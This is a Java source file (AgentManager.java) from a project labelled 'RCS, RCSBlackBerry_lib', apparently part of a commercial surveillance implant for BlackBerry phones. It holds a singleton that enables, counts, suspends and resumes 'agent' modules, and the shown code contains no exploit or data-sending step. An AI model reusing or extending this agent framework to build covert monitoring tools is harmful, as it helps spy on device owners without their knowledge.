//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AgentManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Enumeration;
import java.util.Vector;

import net.rim.device.api.system.RuntimeStore;
import blackberry.agent.Module;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import blackberry.interfaces.UserAgent;

/**
 * The Class AgentManager.
 */
public final class AgentManager extends JobManager implements Singleton {

    private static final long GUID = 0xfa169781286585c3L;

    /** The debug instance. */
    //#ifdef DEBUG
    static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    static AgentManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     * 
     * @return single instance of AgentManager
     */
    public static synchronized AgentManager getInstance() {
        if (instance == null) {
            instance = (AgentManager) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final AgentManager singleton = new AgentManager();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    /**
     * Re enable agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean reEnableAgent(final String agentId) {
        final Module agent = (Module) get(agentId);

        if (agent == null) {
            //#ifdef DEBUG
            debug.error("cannot renable agent " + agent);
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.trace("ReEnabling " + agent);
        //#endif
        agent.enable(true);
        return true;
    }

    /**
     * Re enable agents.
     * 
     * @return true, if successful
     */
    public synchronized boolean reEnableAgents() {
        final Enumeration e = hashtable.elements();

        while (e.hasMoreElements()) {
            final Module agent = (Module) e.nextElement();
            reEnableAgent(agent.getId());
        }

        return true;
    }

    /**
     * Count enabled agents.
     * 
     * @return the int
     */
    public synchronized int countEnabledAgents() {
        int enabled = 0;
        final Enumeration e = hashtable.elements();

        while (e.hasMoreElements()) {
            final Module agent = (Module) e.nextElement();

            if (agent.isEnabled()) {
                enabled++;
            }
        }

        return enabled;
    }

    public void resumeUserAgents() {
        //#ifdef DEBUG
        debug.trace("resumeUserAgents");
        //#endif
        Vector vector = getAllItems();
        for (int i = 0; i < vector.size(); i++) {
            Module agent = (Module) vector.elementAt(i);
            if (agent instanceof UserAgent) {
                if (agent.isEnabled() && !agent.isRunning()) {
                    //#ifdef DEBUG

                    debug.trace("resumeUserAgents: " + agent);
                    //#endif
                    start(agent.getId());
                }
            }
        }
    }

    public void suspendUserAgents() {
        //#ifdef DEBUG 
        debug.trace("suspendUserAgents");

        //#endif 
        Vector vector = getAllItems();
        for (int i = 0; i < vector.size(); i++) {
            Module agent = (Module) vector.elementAt(i);
            if (agent instanceof UserAgent) {
                if (agent.isEnabled() &&

                agent.isRunning()) {
                    //#ifdef DEBUG 
                    debug.trace("suspendUserAgents: " + agent); 
                    //#endif 
                    stop(agent.getId());
                }
            }
        }
    }

}
